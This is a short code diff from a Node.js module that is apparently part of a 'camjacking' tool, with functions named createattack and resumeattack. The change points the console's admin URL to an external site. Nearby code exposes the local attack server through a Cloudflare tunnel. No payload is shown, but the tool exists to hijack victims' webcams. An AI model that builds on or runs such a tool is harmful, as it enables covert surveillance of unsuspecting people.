@@ -100,7 +100,7 @@ async function resumeattack(name,template,uuid, currentDateTime,rl,mainMenu) {
     console.log(`\n[+] New Target Created: ${ORANGE}${name}${RESET}`);
     console.log(`[+] ${ORANGE}${name}${RESET} UUID: ${ORANGE}${uuid}${RESET}`);
     console.log(`[+] Template selected: ${ORANGE}${template}${RESET}`);
-    console.log(`[+] Admin page URL: ${ORANGE}http://localhost:5000/${RESET}`);
+    console.log(`[+] Admin page URL: ${ORANGE}https://cappriciosec.com/camjacking${RESET}`);
     console.log(`[+] Camjacking server running at: ${ORANGE}http://localhost:8080/?uuid=${uuid}${RESET}`);
 
     if (publicUrl) {
@@ -214,6 +214,7 @@ function startCloudflareTunnel(localUrl = "http://localhost:8080") {
     });
   });
 }
+
 
 
 module.exports = { createattack ,showSelectTargetMenu,resumeattack};
